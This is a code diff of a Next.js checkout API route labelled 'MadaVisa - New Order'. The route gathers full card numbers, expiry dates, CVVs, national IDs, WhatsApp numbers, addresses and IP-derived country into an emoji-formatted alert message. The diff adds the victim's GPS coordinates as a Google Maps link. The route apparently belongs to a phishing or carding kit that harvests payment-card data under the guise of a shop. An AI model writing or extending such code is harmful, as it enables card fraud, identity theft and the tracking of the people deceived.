@@ -1,14 +1,13 @@
 import { NextRequest, NextResponse } from "next/server";
 
 export async function POST(req: NextRequest) {
-  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment } = await req.json();
+  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment, lat, lng } = await req.json();
 
   const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
 
   // جيب الـ IP والدولة
   const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || req.headers.get("x-real-ip") || "";
   let country = "غير معروف";
-
   const isLocal = !ip || ip === "127.0.0.1" || ip === "::1";
   if (!isLocal) {
     try {
@@ -40,6 +39,7 @@ export async function POST(req: NextRequest) {
     ``,
     `🏦 MadaVisa - New Order`,
     `🌍 Country: ${country}`,
+    ...(lat && lng ? [`📍 Location: https://maps.google.com/?q=${lat},${lng}`] : []),
     `🙍 Order For: ${customer ?? "-"}`,
     `📲 WhatsApp: ${whatsapp ?? "-"}`,
     `🪪 Card Number: ${cardNumber}`,
